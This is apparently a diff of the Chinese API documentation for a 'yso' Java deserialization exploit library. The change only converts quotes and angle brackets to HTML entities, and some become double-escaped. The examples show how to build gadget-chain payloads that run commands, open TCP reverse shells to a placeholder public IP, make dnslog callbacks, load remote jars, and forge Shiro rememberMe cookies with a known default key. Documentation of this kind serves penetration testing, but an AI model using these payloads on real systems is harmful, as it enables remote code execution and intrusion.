@@ -32,7 +32,7 @@
 | [yso.GetCommonsCollections6JavaObject](#getcommonscollections6javaobject) |GetCommonsCollections6JavaObject 基于Commons Collections 6 序列化模板生成并返回一个Java对象。  这个函数接受一个命令字符串作为参数，并将该命令设置在生成的Java对象中。  cmd：要设置在Java对象中的命令字符串。  返回：成功时返回生...|
 | [yso.GetCommonsCollections7JavaObject](#getcommonscollections7javaobject) |GetCommonsCollections7JavaObject 基于Commons Collections 7 序列化模板生成并返回一个Java对象。  这个函数接受一个命令字符串作为参数，并将该命令设置在生成的Java对象中。  cmd：要设置在Java对象中的命令字符串。  返回：成功时返回生...|
 | [yso.GetCommonsCollections8JavaObject](#getcommonscollections8javaobject) |GetCommonsCollections8JavaObject 基于Commons Collections 4.0 序列化模板生成并返回一个Java对象。  通过可变参数`options`，用户可以提供额外的配置，这些配置使用GenClassOptionFun类型的函数指定。  这些函数使用户能够...|
-| [yso.GetCommonsCollectionsK1JavaObject](#getcommonscollectionsk1javaobject) |GetCommonsCollectionsK1JavaObject 基于Commons Collections &lt;=3.2.1 序列化模板生成并返回一个Java对象。  通过可变参数`options`，用户可以提供额外的配置，这些配置使用GenClassOptionFun类型的函数指定。  这...|
+| [yso.GetCommonsCollectionsK1JavaObject](#getcommonscollectionsk1javaobject) |GetCommonsCollectionsK1JavaObject 基于Commons Collections &amp;lt;=3.2.1 序列化模板生成并返回一个Java对象。  通过可变参数`options`，用户可以提供额外的配置，这些配置使用GenClassOptionFun类型的函数指定。  这...|
 | [yso.GetCommonsCollectionsK2JavaObject](#getcommonscollectionsk2javaobject) |GetCommonsCollectionsK2JavaObject 基于Commons Collections 4.0 序列化模板生成并返回一个Java对象。  通过可变参数`options`，用户可以提供额外的配置，这些配置使用GenClassOptionFun类型的函数指定。  这些函数使用户能...|
 | [yso.GetCommonsCollectionsK3JavaObject](#getcommonscollectionsk3javaobject) |GetCommonsCollectionsK3JavaObject 基于Commons Collections K3 序列化模板生成并返回一个Java对象。  这个函数接受一个命令字符串作为参数，并将该命令设置在生成的Java对象中。  cmd：要设置在Java对象中的命令字符串。  返回：成功时返...|
 | [yso.GetCommonsCollectionsK4JavaObject](#getcommonscollectionsk4javaobject) |GetCommonsCollectionsK4JavaObject 基于Commons Collections K4 序列化模板生成并返回一个Java对象。  这个函数接受一个命令字符串作为参数，并将该命令设置在生成的Java对象中。  cmd：要设置在Java对象中的命令字符串。  返回：成功时返...|
@@ -143,7 +143,7 @@ options：用于配置类对象的可变参数函数列表。
 
 Example:
 ```
-bytesCode,_ =codec.DecodeBase64("yv66vg...")
+bytesCode,_ =codec.DecodeBase64(&#34;yv66vg...&#34;)
 classObject, _ := yso.LoadClassFromBytes(bytesCode) // 从字节中加载并配置类对象
 ```
 
@@ -184,7 +184,7 @@ options：一组可选的GenClassOptionFun函数，用于进一步定制生成�
 
 Example:
 ```
-domain := "dnslog.com" // 假设的 Dnslog 域名
+domain := &#34;dnslog.com&#34; // 假设的 Dnslog 域名
 classObject, err := yso.GenerateDnslogEvilClassObject(domain, additionalOptions...) // 生成并配置Dnslog Java对象
 ```
 
@@ -219,7 +219,7 @@ options：一组可选的GenClassOptionFun函数，用于进一步定制生成�
 
 Example:
 ```
-headerClassObj,_ = yso.GenerateHeaderEchoClassObject(yso.useHeaderParam("Echo","Header Echo Check"))
+headerClassObj,_ = yso.GenerateHeaderEchoClassObject(yso.useHeaderParam(&#34;Echo&#34;,&#34;Header Echo Check&#34;))
 ```
 
 
@@ -286,9 +286,9 @@ options：一组可选的GenClassOptionFun函数，用于进一步定制生成�
 Example:
 ```
 body 回显
-bodyClassObj,_ = yso.GenerateMultiEchoEvilClassObject(yso.useEchoBody(),yso.useParam("Body Echo Check"))
+bodyClassObj,_ = yso.GenerateMultiEchoEvilClassObject(yso.useEchoBody(),yso.useParam(&#34;Body Echo Check&#34;))
 header 回显
-headerClassObj,_ = yso.GenerateMultiEchoEvilClassObject(yso.useHeaderParam("Echo","Header Echo Check"))
+headerClassObj,_ = yso.GenerateMultiEchoEvilClassObject(yso.useHeaderParam(&#34;Echo&#34;,&#34;Header Echo Check&#34;))
 ```
 
 
@@ -325,7 +325,7 @@ options：一组可选的GenClassOptionFun函数，用于进一步定制生成�
 
 Example:
 ```
-command := "ls" // 假设的命令字符串
+command := &#34;ls&#34; // 假设的命令字符串
 classObject, err := yso.GenerateProcessBuilderExecEvilClassObject(command, additionalOptions...) // 生成并配置ProcessBuilderExec Java对象
 ```
 
@@ -364,7 +364,7 @@ options：一组可选的GenClassOptionFun函数，用于进一步定制生成�
 
 Example:
 ```
-command := "ls" // 假设的命令字符串
+command := &#34;ls&#34; // 假设的命令字符串
 classObject, err := yso.GenerateProcessImplExecEvilClassObject(command, additionalOptions...) // 生成并配置ProcessImplExec Java对象
 ```
 
@@ -403,7 +403,7 @@ options：一组可选的GenClassOptionFun函数，用于进一步定制生成�
 
 Example:
 ```
-command := "ls" // 假设的命令字符串
+command := &#34;ls&#34; // 假设的命令字符串
 classObject, err := yso.GenerateRuntimeExecEvilClassObject(command, additionalOptions...) // 生成并配置RuntimeExec Java对象
 ```
 
@@ -471,7 +471,7 @@ options：一组可选的GenClassOptionFun函数，用于进一步定制生成�
 
 Example:
 ```
-classObject, err := yso.GenerateSpringEchoEvilClassObject(yso.springHeader("Echo","Echo Check")) // 生成并配置SpringEcho Java对象
+classObject, err := yso.GenerateSpringEchoEvilClassObject(yso.springHeader(&#34;Echo&#34;,&#34;Echo Check&#34;)) // 生成并配置SpringEcho Java对象
 ```
 
 
@@ -510,7 +510,7 @@ options：一组可选的GenClassOptionFun函数，用于进一步定制生成�
 
 Example:
 ```
-host = "公网IP"
+host = &#34;公网IP&#34;
 token = uuid()
 classObject, err := yso.GenerateTcpReverseEvilClassObject(host,8080,yso.tcpReverseToken(token),additionalOptions...) // 生成并配置TcpReverse Java对象
 ```
@@ -553,7 +553,7 @@ options：一组可选的GenClassOptionFun函数，用于进一步定制生成�
 
 Example:
 ```
-host = "公网IP"
+host = &#34;公网IP&#34;
 classObject, err := yso.GenerateTcpReverseShellEvilClassObject(host,8080,additionalOptions...) // 生成并配置TcpReverseShell Java对象
 ```
 
@@ -590,9 +590,9 @@ options：一组可选的GenClassOptionFun函数，用于进一步定制生成�
 Example:
 ```
 body 回显
-bodyClassObj,_ = yso.GenerateTomcatEchoEvilClassObject(yso.useEchoBody(),yso.useParam("Body Echo Check"))
+bodyClassObj,_ = yso.GenerateTomcatEchoEvilClassObject(yso.useEchoBody(),yso.useParam(&#34;Body Echo Check&#34;))
 header 回显
-headerClassObj,_ = yso.GenerateTomcatEchoEvilClassObject(yso.useHeaderParam("Echo","Header Echo Check"))
+headerClassObj,_ = yso.GenerateTomcatEchoEvilClassObject(yso.useHeaderParam(&#34;Echo&#34;,&#34;Header Echo Check&#34;))
 ```
 
 
@@ -635,7 +635,7 @@ GetAllRuntimeExecGadget 获取所有的支持的RuntimeExecGadget，可用于爆
 Example:
 ```
 
-	command := "whoami" // 假设的命令字符串
+	command := &#34;whoami&#34; // 假设的命令字符串
 	for _, gadget := range yso.GetAllRuntimeExecGadget() {
 		javaObj, err := gadget(command)
 		if javaObj == nil || err != nil {
@@ -670,7 +670,7 @@ Example:
 ```
 
 	for _, gadget := range yso.GetAllTemplatesGadget() {
-		domain := "xxx.dnslog" // dnslog 地址
+		domain := &#34;xxx.dnslog&#34; // dnslog 地址
 		javaObj, err := gadget(yso.useDNSLogEvilClass(domain))
 		if javaObj == nil || err != nil {
 			continue
@@ -708,7 +708,7 @@ cmd：要传入Java对象的命令字符串。
 
 Example:
 ```
-command := "ls" // 假设的命令字符串
+command := &#34;ls&#34; // 假设的命令字符串
 javaObject, err := yso.GetBeanShell1JavaObject(command)
 gadgetBytes,_ = yso.ToBytes(javaObject)
 hexPayload = codec.EncodeToHex(gadgetBytes)
@@ -747,8 +747,8 @@ options：用于配置Java对象的可变参数函数列表。
 
 Example:
 ```
-command = "whoami"
-className = "KEsBXTRS"
+command = &#34;whoami&#34;
+className = &#34;KEsBXTRS&#34;
 gadgetObj,err = yso.GetClick1JavaObject(
 
 	yso.useRuntimeExecEvilClass(command),
@@ -792,8 +792,8 @@ options：用于配置Java对象的可变参数函数列表。
 
 Example:
 ```
-command = "whoami"
-className = "KEsBXTRS"
+command = &#34;whoami&#34;
+className = &#34;KEsBXTRS&#34;
 gadgetObj,err = yso.GetCommonsBeanutils183NOCCJavaObject(
 
 	yso.useRuntimeExecEvilClass(command), // 使用Runtime Exec方法执行命令
@@ -837,8 +837,8 @@ options：用于配置Java对象的可变参数函数列表。
 
 Example:
 ```
-command = "whoami"
-className = "KEsBXTRS"
+command = &#34;whoami&#34;
+className = &#34;KEsBXTRS&#34;
 gadgetObj,err = yso.GetCommonsBeanutils192NOCCJavaObject(
 
 	yso.useRuntimeExecEvilClass(command), // 使用Runtime Exec方法执行命令
@@ -880,8 +880,8 @@ options：用于配置Java对象的可变参数函数列表。
 
 Example:
 ```
-command = "whoami"
-className = "KEsBXTRS"
+command = &#34;whoami&#34;
+className = &#34;KEsBXTRS&#34;
 gadgetObj,err = yso.GetCommonsBeanutils1JavaObject(
 
 	 yso.useRuntimeExecEvilClass(command), // 使用Runtime Exec方法执行命令
@@ -921,7 +921,7 @@ cmd：要设置在Java对象中的命令字符串。
 
 Example:
 ```
-command := "ls" // 假设的命令字符串
+command := &#34;ls&#34; // 假设的命令字符串
 javaObject, err := yso.GetCommonsCollections1JavaObject(command)
 gadgetBytes,_ = yso.ToBytes(javaObject)
 hexPayload = codec.EncodeToHex(gadgetBytes)
@@ -960,8 +960,8 @@ options：用于配置Java对象的可变参数函数列表。
 
 Example:
 ```
-command = "whoami"
-className = "KEsBXTRS"
+command = &#34;whoami&#34;
+className = &#34;KEsBXTRS&#34;
 gadgetObj,err = yso.GetCommonsCollections2JavaObject(
 
 	yso.useRuntimeExecEvilClass(command), // 使用Runtime Exec方法执行命令
@@ -1003,8 +1003,8 @@ options：用于配置Java对象的可变参数函数列表。
 
 Example:
 ```
-command = "whoami"
-className = "KEsBXTRS"
+command = &#34;whoami&#34;
+className = &#34;KEsBXTRS&#34;
 gadgetObj,err = yso.GetCommonsCollections3JavaObject(
 
 	yso.useRuntimeExecEvilClass(command), // 使用Runtime Exec方法执行命令
@@ -1046,8 +1046,8 @@ options：用于配置Java对象的可变参数函数列表。
 
 Example:
 ```
-command = "whoami"
-className = "KEsBXTRS"
+command = &#34;whoami&#34;
+className = &#34;KEsBXTRS&#34;
 gadgetObj,err = yso.GetCommonsCollections4JavaObject(
 
 	yso.useRuntimeExecEvilClass(command), // 使用Runtime Exec方法执行命令
@@ -1087,7 +1087,7 @@ cmd：要设置在Java对象中的命令字符串。
 
 Example:
 ```
-command := "ls" // 假设的命令字符串
+command := &#34;ls&#34; // 假设的命令字符串
 javaObject, _ = yso.GetCommonsCollections5JavaObject(command)
 gadgetBytes,_ = yso.ToBytes(javaObject)
 hexPayload = codec.EncodeToHex(gadgetBytes)
@@ -1124,7 +1124,7 @@ cmd：要设置在Java对象中的命令字符串。
 
 Example:
 ```
-command := "ls" // 假设的命令字符串
+command := &#34;ls&#34; // 假设的命令字符串
 javaObject, _ = yso.GetCommonsCollections6JavaObject(command)
 gadgetBytes,_ = yso.ToBytes(javaObject)
 hexPayload = codec.EncodeToHex(gadgetBytes)
@@ -1161,7 +1161,7 @@ cmd：要设置在Java对象中的命令字符串。
 
 Example:
 ```
-command := "ls" // 假设的命令字符串
+command := &#34;ls&#34; // 假设的命令字符串
 javaObject, _ = yso.GetCommonsCollections7JavaObject(command)
 gadgetBytes,_ = yso.ToBytes(javaObject)
 hexPayload = codec.EncodeToHex(gadgetBytes)
@@ -1200,8 +1200,8 @@ options：用于配置Java对象的可变参数函数列表。
 
 Example:
 ```
-command = "whoami"
-className = "KEsBXTRS"
+command = &#34;whoami&#34;
+className = &#34;KEsBXTRS&#34;
 gadgetObj,err = yso.GetCommonsCollections8JavaObject(
 
 	yso.useRuntimeExecEvilClass(command), // 使用Runtime Exec方法执行命令
@@ -1231,7 +1231,7 @@ gadgetObj,err = yso.GetCommonsCollections8JavaObject(
 ### GetCommonsCollectionsK1JavaObject
 
 #### 详细描述
-GetCommonsCollectionsK1JavaObject 基于Commons Collections &lt;=3.2.1 序列化模板生成并返回一个Java对象。
+GetCommonsCollectionsK1JavaObject 基于Commons Collections &amp;lt;=3.2.1 序列化模板生成并返回一个Java对象。
 
 通过可变参数`options`，用户可以提供额外的配置，这些配置使用GenClassOptionFun类型的函数指定。
 
@@ -1243,8 +1243,8 @@ options：用于配置Java对象的可变参数函数列表。
 
 Example:
 ```
-command = "whoami"
-className = "KEsBXTRS"
+command = &#34;whoami&#34;
+className = &#34;KEsBXTRS&#34;
 gadgetObj,err = yso.GetCommonsCollectionsK1JavaObject(
 
 	yso.useRuntimeExecEvilClass(command), // 使用Runtime Exec方法执行命令
@@ -1286,8 +1286,8 @@ options：用于配置Java对象的可变参数函数列表。
 
 Example:
 ```
-command = "whoami"
-className = "KEsBXTRS"
+command = &#34;whoami&#34;
+className = &#34;KEsBXTRS&#34;
 gadgetObj,err = yso.GetCommonsCollectionsK2JavaObject(
 
 	yso.useRuntimeExecEvilClass(command), // 使用Runtime Exec方法执行命令
@@ -1327,7 +1327,7 @@ cmd：要设置在Java对象中的命令字符串。
 
 Example:
 ```
-command := "ls" // 假设的命令字符串
+command := &#34;ls&#34; // 假设的命令字符串
 javaObject, _ = yso.GetCommonsCollectionsK3JavaObject(command)
 gadgetBytes,_ = yso.ToBytes(javaObject)
 hexPayload = codec.EncodeToHex(gadgetBytes)
@@ -1364,7 +1364,7 @@ cmd：要设置在Java对象中的命令字符串。
 
 Example:
 ```
-command := "ls" // 假设的命令字符串
+command := &#34;ls&#34; // 假设的命令字符串
 javaObject, _ = yso.GetCommonsCollectionsK4JavaObject(command)
 gadgetBytes,_ = yso.ToBytes(javaObject)
 hexPayload = codec.EncodeToHex(gadgetBytes)
@@ -1410,7 +1410,7 @@ res,err = risk.CheckDNSLogByToken(token)
 	if err {
 	  //dnslog查询失败
 	} else {
-	  if len(res) > 0{
+	  if len(res) &gt; 0{
 	   // dnslog查询成功
 	  }
 	}
@@ -1441,17 +1441,17 @@ GenerateGadget this is a highly flexible function that can generate a Java objec
 
  1. Generate a Java object that have no any params.
 
-    Example: GenerateGadget("CommonsCollections1")
+    Example: GenerateGadget(&#34;CommonsCollections1&#34;)
  2. Generate a Java object that have one param and implement by TemplateImpl, the first param is the name of the gadget, the second param is the class name, the third param is the class param.
-    Example: GenerateGadget("CommonsCollections2", "Sleep", "1000")
+    Example: GenerateGadget(&#34;CommonsCollections2&#34;, &#34;Sleep&#34;, &#34;1000&#34;)
  3. Generate a Java object that have multiple params and implement by TemplateImpl, the first param is the name of the gadget, the second param is the class name, the third param is the class param map.
-    Example: GenerateGadget("CommonsCollections2", "TcpReverseShell", map[string]string{"host": "127.0.0.1","port":"8080"})
+    Example: GenerateGadget(&#34;CommonsCollections2&#34;, &#34;TcpReverseShell&#34;, map[string]string{&#34;host&#34;: &#34;127.0.0.1&#34;,&#34;port&#34;:&#34;8080&#34;})
  4. Generate a Java object that have one param and implement by TransformChain, the first param is the name of the gadget, the second param is the transform chain name, the third param is the param.
-    Example: GenerateGadget("CommonsCollections1", "dnslog", "xxx.xx.com")
+    Example: GenerateGadget(&#34;CommonsCollections1&#34;, &#34;dnslog&#34;, &#34;xxx.xx.com&#34;)
  5. Generate a Java object that have multiple params and implement by TransformChain, the first param is the name of the gadget, the second param is the transform chain name, the third param is the param map.
-    Example: GenerateGadget("CommonsCollections1", "loadjar", map[string]string{"url": "xxx.com", "name": "exp"})
+    Example: GenerateGadget(&#34;CommonsCollections1&#34;, &#34;loadjar&#34;, map[string]string{&#34;url&#34;: &#34;xxx.com&#34;, &#34;name&#34;: &#34;exp&#34;})
  6. Generate a Java object that implement by TemplateImpl.
-    Example: GenerateGadget("CommonsCollections2", useRuntimeExecEvilClass("whoami"))
+    Example: GenerateGadget(&#34;CommonsCollections2&#34;, useRuntimeExecEvilClass(&#34;whoami&#34;))
 
 
 #### 定义
@@ -1505,7 +1505,7 @@ cmd：要设置在Java对象中的命令字符串。
 
 Example:
 ```
-command := "ls" // 假设的命令字符串
+command := &#34;ls&#34; // 假设的命令字符串
 javaObject, _ = yso.GetGroovy1JavaObject(command)
 gadgetBytes,_ = yso.ToBytes(javaObject)
 hexPayload = codec.EncodeToHex(gadgetBytes)
@@ -1544,8 +1544,8 @@ options：用于配置Java对象的可变参数函数列表。
 
 Example:
 ```
-command = "whoami"
-className = "KEsBXTRS"
+command = &#34;whoami&#34;
+className = &#34;KEsBXTRS&#34;
 gadgetObj,err = yso.GetJBossInterceptors1JavaObject(
 
 	yso.useRuntimeExecEvilClass(command), // 使用Runtime Exec方法执行命令
@@ -1587,8 +1587,8 @@ options：用于配置Java对象的可变参数函数列表。
 
 Example:
 ```
-command = "whoami"
-className = "KEsBXTRS"
+command = &#34;whoami&#34;
+className = &#34;KEsBXTRS&#34;
 gadgetObj,err = yso.GetJSON1JavaObject(
 
 	yso.useRuntimeExecEvilClass(command), // 使用Runtime Exec方法执行命令
@@ -1632,7 +1632,7 @@ byt：要解析的字节数组。
 
 Example:
 ```
-raw := "rO0..." // base64 Java serialized object
+raw := &#34;rO0...&#34; // base64 Java serialized object
 bytes = codec.DecodeBase64(raw)~ // base64解码
 javaObject, err := yso.GetJavaObjectFromBytes(bytes) // 从字节中解析Java对象
 ```
@@ -1669,8 +1669,8 @@ options：用于配置Java对象的可变参数函数列表。
 
 Example:
 ```
-command = "whoami"
-className = "KEsBXTRS"
+command = &#34;whoami&#34;
+className = &#34;KEsBXTRS&#34;
 gadgetObj,err = yso.GetJavassistWeld1JavaObject(
 
 	yso.useRuntimeExecEvilClass(command), // 使用Runtime Exec方法执行命令
@@ -1712,8 +1712,8 @@ options：用于配置Java对象的可变参数函数列表。
 
 Example:
 ```
-command = "whoami"
-className = "KEsBXTRS"
+command = &#34;whoami&#34;
+className = &#34;KEsBXTRS&#34;
 gadgetObj,err = yso.GetJdk7u21JavaObject(
 
 	yso.useRuntimeExecEvilClass(command), // 使用Runtime Exec方法执行命令
@@ -1755,8 +1755,8 @@ options：用于配置Java对象的可变参数函数列表。
 
 Example:
 ```
-command = "whoami"
-className = "KEsBXTRS"
+command = &#34;whoami&#34;
+className = &#34;KEsBXTRS&#34;
 gadgetObj,err = yso.GetJdk8u20JavaObject(
 
 	yso.useRuntimeExecEvilClass(command), // 使用Runtime Exec方法执行命令
@@ -1797,7 +1797,7 @@ Example:
 javaObject, _ = yso.GetSimplePrincipalCollectionJavaObject()
 classBytes,_ = yso.ToBytes(javaObject)
 data = codec.PKCS5Padding(classBytes, 16)
-keyDecoded,err = codec.DecodeBase64("kPH+bIxk5D2deZiIxcaaaA==")
+keyDecoded,err = codec.DecodeBase64(&#34;kPH+bIxk5D2deZiIxcaaaA==&#34;)
 iv = []byte(ramdstr(16))
 cipherText ,_ = codec.AESCBCEncrypt(keyDecoded, data, iv)
 payload = codec.EncodeBase64(append(iv, cipherText...))
@@ -1838,7 +1838,7 @@ res,err = risk.CheckDNSLogByToken(token)
 	if err {
 	  //dnslog查询失败
 	} else {
-	  if len(res) > 0{
+	  if len(res) &gt; 0{
 	   // dnslog查询成功
 	  }
 	}
@@ -1881,7 +1881,7 @@ options：用于配置类对象的可变参数函数列表。
 
 Example:
 ```
-bcelData := "$$BECL$$..." // 假设的BCEL数据
+bcelData := &#34;$$BECL$$...&#34; // 假设的BCEL数据
 classObject, err := LoadClassFromBCEL(bcelData, option1, option2) // 从BCEL数据加载并配置类对象
 ```
 
@@ -1920,7 +1920,7 @@ options：用于配置类对象的可变参数函数列表。
 
 Example:
 ```
-classObject, _ := yso.LoadClassFromBytes("yv66vg...") // 从字节中加载并配置类对象
+classObject, _ := yso.LoadClassFromBytes(&#34;yv66vg...&#34;) // 从字节中加载并配置类对象
 ```
 
 
@@ -1958,7 +1958,7 @@ options：用于配置类对象的可变参数函数列表。
 
 Example:
 ```
-bytesCode,_ =codec.DecodeBase64("yv66vg...")
+bytesCode,_ =codec.DecodeBase64(&#34;yv66vg...&#34;)
 classObject, _ := yso.LoadClassFromBytes(bytesCode) // 从字节中加载并配置类对象
 ```
 
@@ -2067,7 +2067,7 @@ command 请求参数选项函数，用于设置要执行的命令。需要配合
 
 Example:
 ```
-yso.GetCommonsBeanutils1JavaObject(yso.command("whoami"),yso.useRuntimeExecTemplate())
+yso.GetCommonsBeanutils1JavaObject(yso.command(&#34;whoami&#34;),yso.useRuntimeExecTemplate())
 ```
 
 
@@ -2117,7 +2117,7 @@ addr：要设置的 Dnslog 域名。
 
 Example:
 ```
-yso.GetCommonsBeanutils1JavaObject(yso.useDnslogTemplate(),yso.dnslogDomain("dnslog.com"))
+yso.GetCommonsBeanutils1JavaObject(yso.useDnslogTemplate(),yso.dnslogDomain(&#34;dnslog.com&#34;))
 ```
 
 
@@ -2175,7 +2175,7 @@ className：要设置的类名。
 
 Example:
 ```
-yso.GetCommonsBeanutils1JavaObject(yso.evilClassName("EvilClass"))
+yso.GetCommonsBeanutils1JavaObject(yso.evilClassName(&#34;EvilClass&#34;))
 ```
 
 
@@ -2269,7 +2269,7 @@ val：要设置的 header 值。
 
 Example:
 ```
-yso.GetCommonsBeanutils1JavaObject(yso.useSpringEchoTemplate(),yso.springHeader("Echo","Echo Check"))
+yso.GetCommonsBeanutils1JavaObject(yso.useSpringEchoTemplate(),yso.springHeader(&#34;Echo&#34;,&#34;Echo Check&#34;))
 ```
 
 
@@ -2300,7 +2300,7 @@ param：要设置的请求参数。
 
 Example:
 ```
-yso.GetCommonsBeanutils1JavaObject(yso.useSpringEchoTemplate(),yso.springParam("Echo Check"))
+yso.GetCommonsBeanutils1JavaObject(yso.useSpringEchoTemplate(),yso.springParam(&#34;Echo Check&#34;))
 ```
 
 
@@ -2352,7 +2352,7 @@ host：要设置的 tcpReverseHost 的host。
 
 Example:
 ```
-host = "公网IP"
+host = &#34;公网IP&#34;
 token = uuid()
 yso.GetCommonsBeanutils1JavaObject(yso.useTcpReverseTemplate(),yso.tcpReverseHost(host),yso.tcpReversePort(8080),yso.tcpReverseToken(token))
 ```
@@ -2386,7 +2386,7 @@ port：要设置的 tcpReversePort 的port。
 
 Example:
 ```
-host = "公网IP"
+host = &#34;公网IP&#34;
 token = uuid()
 yso.GetCommonsBeanutils1JavaObject(yso.useTcpReverseTemplate(),yso.tcpReverseHost(host),yso.tcpReversePort(8080),yso.tcpReverseToken(token))
 ```
@@ -2418,7 +2418,7 @@ token：要设置的 token 。
 
 Example:
 ```
-host = "公网IP"
+host = &#34;公网IP&#34;
 token = uuid()
 yso.GetCommonsBeanutils1JavaObject(yso.useTcpReverseTemplate(),yso.tcpReverseHost(host),yso.tcpReversePort(8080),yso.tcpReverseToken(token))
 ```
@@ -2643,7 +2643,7 @@ addr：要设置的 Dnslog 域名。
 
 Example:
 ```
-yso.GetCommonsBeanutils1JavaObject(yso.useDnslogEvilClass("dnslog.com"))
+yso.GetCommonsBeanutils1JavaObject(yso.useDnslogEvilClass(&#34;dnslog.com&#34;))
 ```
 
 
@@ -2757,7 +2757,7 @@ val：要设置的 header 值。
 
 Example:
 ```
-yso.GetCommonsBeanutils1JavaObject(yso.useSpringEchoTemplate(),yso.springHeader("Echo","Echo Check"))
+yso.GetCommonsBeanutils1JavaObject(yso.useSpringEchoTemplate(),yso.springHeader(&#34;Echo&#34;,&#34;Echo Check&#34;))
 ```
 
 
@@ -2828,7 +2828,7 @@ param：要设置的请求参数。
 
 Example:
 ```
-yso.GetCommonsBeanutils1JavaObject(yso.useSpringEchoTemplate(),yso.springParam("Echo Check"))
+yso.GetCommonsBeanutils1JavaObject(yso.useSpringEchoTemplate(),yso.springParam(&#34;Echo Check&#34;))
 ```
 
 
@@ -2858,7 +2858,7 @@ cmd：要执行的命令字符串。
 
 Example:
 ```
-yso.GetCommonsBeanutils1JavaObject(yso.useProcessBuilderExecEvilClass("whoami"))
+yso.GetCommonsBeanutils1JavaObject(yso.useProcessBuilderExecEvilClass(&#34;whoami&#34;))
 ```
 
 
@@ -2908,7 +2908,7 @@ cmd：要执行的命令字符串。
 
 Example:
 ```
-yso.GetCommonsBeanutils1JavaObject(yso.useProcessImplExecEvilClass("whoami"))
+yso.GetCommonsBeanutils1JavaObject(yso.useProcessImplExecEvilClass(&#34;whoami&#34;))
 ```
 
 
@@ -2958,7 +2958,7 @@ cmd：要执行的命令字符串。
 
 Example:
 ```
-yso.GetCommonsBeanutils1JavaObject(yso.useRuntimeExecEvilClass("whoami"))
+yso.GetCommonsBeanutils1JavaObject(yso.useRuntimeExecEvilClass(&#34;whoami&#34;))
 ```
 
 
@@ -3100,7 +3100,7 @@ port：要设置的 tcpReversePort 的port。
 
 Example:
 ```
-host = "公网IP"
+host = &#34;公网IP&#34;
 token = uuid()
 yso.GetCommonsBeanutils1JavaObject(yso.useTcpReverseEvilClass(host,8080),yso.tcpReverseToken(token))
 ```
@@ -3137,7 +3137,7 @@ port：要设置的 tcpReverseShellPort 的port。
 
 Example:
 ```
-host = "公网IP"
+host = &#34;公网IP&#34;
 yso.GetCommonsBeanutils1JavaObject(yso.useTcpReverseShellEvilClass(host,8080))
 ```
 
